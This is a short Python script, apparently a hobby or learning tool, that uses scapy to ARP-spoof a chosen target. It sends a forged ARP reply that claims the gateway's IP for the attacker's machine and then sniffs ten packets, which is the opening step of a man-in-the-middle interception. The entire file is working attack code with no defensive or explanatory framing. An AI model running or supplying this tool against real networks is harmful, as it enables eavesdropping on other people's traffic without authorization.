import scapy.all as scapy
import argparse
import ipaddress


def parse_and_validate():
    parser = argparse.ArgumentParser(description='Spoofing and sniffing.')
    parser.add_argument('-t', '--target', required=True, help='The target IP address.')
    parser.add_argument('-g', '--gateway', help='The target gateway IP.')

    args = parser.parse_args()

    try:
        # Target IP
        target = ipaddress.ip_address(args.target)
        print(f"Valid target IP address: {target}")
    except ValueError:
        print("Invalid target IP address or range")
        return None

    try:
        # Gateway IP
        gateway = ipaddress.ip_address(args.gateway)
        print(f"Valid gateway IP address: {gateway}")
    except ValueError:
        print("Invalid gateway IP address or range")
        return None

    return target, gateway


def get_mac(target):
    arp_request = scapy.ARP(pdst=str(target))

    ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request

    responses = scapy.srp(ether_frame, timeout=2, verbose=False)[0]

    return responses[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # Get the MAC
    target_mac = get_mac(target_ip)

    spoof_packet = scapy.ARP(op=2, pdst=str(target_ip), hwdst=target_mac, psrc=spoof_ip)
    scapy.send(spoof_packet, verbose=False)

    print("Spoof packet:")
    spoof_packet.show()

    return spoof_packet


def sniff():
    capture = scapy.sniff(count=10)
    print("Sniffing: ")
    capture.summary()


if __name__ == '__main__':
    target, gateway = parse_and_validate()
    result = spoof(target, gateway)
    sniff()
